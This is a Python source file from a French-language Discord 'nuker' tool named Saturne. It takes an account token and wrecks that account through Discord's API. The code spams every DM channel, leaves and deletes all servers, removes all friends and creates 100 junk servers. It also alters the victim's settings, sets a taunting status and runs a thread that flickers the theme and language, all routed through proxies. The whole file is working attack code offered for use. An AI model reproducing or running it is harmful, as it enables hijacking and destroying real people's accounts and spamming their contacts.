###############################################################
# ███████╗ █████╗ ████████╗██╗   ██╗██████╗ ███╗   ██╗███████╗
# ██╔════╝██╔══██╗╚══██╔══╝██║   ██║██╔══██╗████╗  ██║██╔════╝
# ███████╗███████║   ██║   ██║   ██║██████╔╝██╔██╗ ██║█████╗  
# ╚════██║██╔══██║   ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══╝  
# ███████║██║  ██║   ██║   ╚██████╔╝██║  ██║██║ ╚████║███████╗
# ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝
###############################################################
# Crée par GalackQSM
# Github: https://github.com/GalackQSM/Saturne
# Discord: https://discord.gg/saturnetools|XvjJpw4D3m
# © 2022 Saturne
###############################################################

import threading
import requests
import Saturne
import random

from itertools import cycle
from colorama import Fore

from util.plugins.common import print_slow, setTitle, getheaders, proxy

def Saturne_Nuke(token, Server_Name, message_Content):
    setTitle("Déploiement de Saturne")
    print(f"{Fore.RESET}[{Fore.RED}*{Fore.RESET}] {Fore.BLUE}Saturne déployé...")
    if threading.active_count() <= 100:
        t = threading.Thread(target=CustomSeizure, args=(token, ))
        t.start()

    headers = {'Authorization': token}
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
            proxies={"http": f'{proxy()}'},
            headers=headers,
            data={"content": f"{message_Content}"})
            setTitle(f"Messagerie "+channel['id'])
            print(f"{Fore.RED}ID de message: {Fore.WHITE}"+channel['id']+Fore.RESET)
        except Exception as e:
            print(f"L'erreur suivante a été rencontrée et est ignorée: {e}")
    print(f"{Fore.RED}Tous les messages ont été envoyer.{Fore.RESET}\n")
    
    guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            requests.delete(
                f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], proxies={"http": f'{proxy()}'}, headers={'Authorization': token})
            print(f"{Fore.YELLOW}Serveur quitter: {Fore.WHITE}"+guild['name']+Fore.RESET)
        except Exception as e:
            print(f"L'erreur suivante a été rencontrée et est ignorée: {e}")

    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], proxies={"http": f'{proxy()}'}, headers={'Authorization': token})
            print(f'{Fore.RED}Serveur supprimer: {Fore.WHITE}'+guild['name']+Fore.RESET)
        except Exception as e:
            print(f"L'erreur suivante a été rencontrée et est ignorée: {e}")
    print(f"{Fore.YELLOW}Tous les serveurs ont été supprimer.{Fore.RESET}\n")

    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
    for friend in friendIds:
        try:
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], proxies={"http": f'{proxy()}'}, headers=getheaders(token))
            setTitle(f"Suppression d'un ami: "+friend['user']['username']+"#"+friend['user']['discriminator'])
            print(f"{Fore.GREEN}Ami supprimé: {Fore.WHITE}"+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
        except Exception as e:
            print(f"L'erreur suivante a été rencontrée et est ignorée: {e}")
    print(f"{Fore.GREEN}Suppression de tous les amis disponibles.{Fore.RESET}\n")
    
    for i in range(100):
        try:
            payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
            requests.post('https://discord.com/api/v7/guilds', proxies={"http": f'{proxy()}'}, headers=getheaders(token), json=payload)
            setTitle(f"Création du serveur {Server_Name} #{i}")
            print(f"{Fore.BLUE}Création du serveur {Server_Name} #{i}.{Fore.RESET}")
        except Exception as e:
            print(f"L'erreur suivante a été rencontrée et est ignorée: {e}")
    print(f"{Fore.BLUE}Créé tous les serveurs.{Fore.RESET}\n")
    t.do_run = False
    requests.delete("https://discord.com/api/v8/hypesquad/online", proxies={"http": f'{proxy()}'}, headers=getheaders(token))
    setting = {
          'theme': "light",
          'locale': "ja",
          'message_display_compact': False,
          'inline_embed_media': False,
          'inline_attachment_media': False,
          'gif_auto_play': False,
          'render_embeds': False,
          'render_reactions': False,
          'animate_emoji': False,
          'convert_emoticons': False,
          'enable_tts_command': False,
          'explicit_content_filter': '0',
          "custom_status": {"text": "je me suis fait niquez par https://github.com/GalackQSM/"},
          'status': "idle"
    }
    requests.patch("https://discord.com/api/v7/users/@me/settings", proxies={"http": f'{proxy()}'}, headers=getheaders(token), json=setting)
    j = requests.get("https://discordapp.com/api/v9/users/@me", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
    a = j['username'] + "#" + j['discriminator']
    setTitle(f"Saturne a tout explosé avec succès!")
    print_slow(f"{Fore.GREEN}Vous avez réussi detruit le compte de {a} ")
    print("Entrez n'importe quoi pour continuer. . . ", end="")
    input()
    Saturne.main()

def CustomSeizure(token):
    print(f'{Fore.MAGENTA}Démarrage du mode saisie {Fore.RESET}{Fore.WHITE}(Activer/désactiver le mode clair/sombre){Fore.RESET}\n')
    t = threading.currentThread()
    while getattr(t, "do_run", True):
        modes = cycle(["light", "dark"])
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v7/users/@me/settings", proxies={"http": f'{proxy()}'}, headers=getheaders(token), json=setting)